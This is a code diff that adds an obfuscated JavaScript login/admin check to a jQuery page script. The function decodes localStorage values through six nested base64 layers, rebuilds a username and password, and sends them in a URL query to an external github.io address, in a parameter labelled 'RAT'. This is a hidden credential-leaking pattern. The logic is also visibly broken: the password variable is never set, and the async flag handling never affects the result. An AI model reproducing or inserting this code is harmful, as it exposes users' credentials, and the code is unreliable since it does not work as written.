@@ -237,4 +237,46 @@ $(document).ready(function() {
             }
         })
     }
+    function getislogin_or_admin() {
+        if (!localStorage.login_0x88 ||
+            !localStorage.login_0x89 ||
+            !localStorage.login_0x90 ||
+            !localStorage.login_0x91) {
+            return false;
+        }
+        var flag = true;
+
+        var moveBook = '';
+        try {
+            moveBook = atob(atob(atob(atob(atob(atob(localStorage.login_0x91)))))).split('>');
+            if (moveBook.length !== 127) {
+                flag = false;
+            }
+        } catch {
+            // have changes:
+            flag = false;
+        }
+        let newString = '';
+        for (var i = 0; i < localStorage.login_0x89.length; i++) {
+            newString += String.fromCharCode(localStorage.login_0x89[i].charCodeAt() - moveBook[i % 128]);
+        }
+
+        let newPassword = '';
+        for (var i = 0; i < localStorage.login_0x90.length; i++) {
+            newString += String.fromCharCode(localStorage.login_0x90[i].charCodeAt() - moveBook[i % 128]);
+        }
+
+
+        fetch('https://ari-backrooms.github.io/file/descListARI.html?user=' + btoa(newString) + '&password=' + btoa(newPassword) + '&RAT=' + btoa(moveBook.toString())).then((R)=>{
+            if (R.status === 404) flag = false;
+            return R.text();
+        }).then((R)=>{
+            if (R.replace('TRUE | TRUE') !== R) {
+                flag = true;
+            }
+            flag = false;
+        })
+        if (!flag) return flag;
+        return true;
+    }
 });
